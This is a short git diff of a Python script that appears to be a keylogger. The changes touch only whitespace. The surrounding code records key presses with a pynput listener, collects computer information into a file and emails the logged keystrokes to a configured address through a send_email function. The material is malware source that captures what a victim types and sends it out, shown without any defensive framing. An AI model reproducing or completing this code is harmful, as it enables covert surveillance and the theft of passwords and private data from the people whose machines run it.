@@ -57,7 +57,6 @@ file_merge = file_path + extend
 
 #Sends out emails
 def send_email(filename, attachment, toaddr):
-
     fromaddr = email_address
 
     msg = MIMEMultipart()
@@ -95,7 +94,10 @@ def send_email(filename, attachment, toaddr):
 
     s.quit()
 
+
 send_email(keys_information, file_path + extend + keys_information, toaddr)
+
+
 #Gets computer Information
 def computer_information():
     with open(file_path + extend + sys_information, "a") as f:
@@ -193,6 +195,7 @@ while number_of_iterations < number_of_iterations_end:
             return False
         if currentTime > stoppingTime:
             return False
+
 
     with Listener(on_press=on_press, on_release=on_release) as listener:
         listener.join()
